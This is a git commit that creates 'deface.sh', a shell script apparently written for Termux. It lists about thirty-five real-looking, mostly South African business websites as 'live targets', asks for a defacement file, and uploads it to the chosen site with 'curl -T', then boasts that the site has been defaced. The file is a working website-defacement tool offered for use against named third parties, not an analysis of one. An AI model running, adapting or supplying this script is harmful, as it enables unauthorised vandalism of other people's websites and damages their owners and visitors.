47068cb71bbf682cfc96cbcdcba984e1f5153b4c
The Sixty Nine <52529306+thesixtynine@users.noreply.github.com>
2019-10-20 19:15:17 +0700

    Create deface.sh

---
+++ deface.sh
@@ -0,0 +1,64 @@
+!/usr/bin/shell
+# Life Of Programmer
+# Coded By The Sixty Nine
+
+clear
+reset
+
+echo
+
+lolcat /storage/emulated/0/Termux/deface.txt
+
+echo
+echo "\033[1;32m                   * Coded by The Sixty Nine"
+echo
+echo "          \033[0m\033[101m:       # WEBSITE TARGET LIVE #       :\033[0m\033[1;77m"
+sleep 2
+echo "          ║                                     ║"
+echo "          ║ http://contsol.co.za/               ║"
+echo "          ║ http://colourfactory.co.za/         ║"
+echo "          ║ http://chillibitez.co.za/           ║"
+echo "          ║ http://chasingfantasia.com/         ║"
+echo "          ║ http://centraltech.co.za/           ║"
+echo "          ║ http://cblandscapes.co.za/          ║"
+echo "          ║ http://bee-it.co.za/                ║"
+echo "          ║ http://butterflowers.co.za/         ║"
+echo "          ║ http://bananabox.co.za/             ║"
+echo "          ║ http://ayk.co.za/                   ║"
+echo "          ║ http://ads247.co.za/                ║"
+echo "          ║ http://allpaint.co.za/              ║"
+echo "          ║ http://atlanticphysio.co.za/        ║"
+echo "          ║ http://valdicare.co.za/             ║"
+echo "          ║ http://vmicl.co.za/                 ║"
+echo "          ║ http://troon.co.za/                 ║"
+echo "          ║ http://nyarhi.co.za/                ║"
+echo "          ║ http://nitrobikes.co.za/            ║"
+echo "          ║ http://nhisa.co.za/                 ║"
+echo "          ║ http://netcallcollect.co.za/        ║"
+echo "          ║ http://naturaleyeimages.com/        ║"
+echo "          ║ http://mpark.co.za/                 ║"
+echo "          ║ http://moneyin1week.co.za/          ║"
+echo "          ║ http://mix007.co.za/                ║"
+echo "          ║ http://mediacube.co.za/             ║"
+echo "          ║ http://megro.co.za/                 ║"
+echo "          ║ http://menogold.co.za/              ║"
+echo "          ║ http://mestern.co.za/               ║"
+echo "          ║ http://tcmgroup.co.za/              ║"
+echo "          ║ http://sublimeconfectionery.co.za/  ║"
+echo "          ║ http://tieronecapital.co.za/        ║"
+echo "          ║ http://thegiftstore.co.za/          ║"
+echo "          ║ http://thefoundation.co.za/         ║"
+echo "          ║ http://tressor.co.za/               ║"
+echo "          ╚═════════════════════════════════════╝"
+sleep 2
+
+echo "\033[1;33m "
+read -p "Enter your Script Deface Name : " script
+read -p "Paste One of The Web Above : " target
+curl -T /storage/emulated/0/$script $target
+echo
+echo
+echo "\033[1;34m[\033[1;37m√\033[1;34m]\033[1;32m THE WEB HAS BEEN DEFERRED \033[1;34m[\033[1;37m√\033[1;34m]"
+echo "\033[1;34m[\033[1;37m*\033[1;34m]\033[1;35m PLEASE LOOK AT MY BOSS \033[1;31m  ===>\033[1;37m $target$script"
+echo
+echo
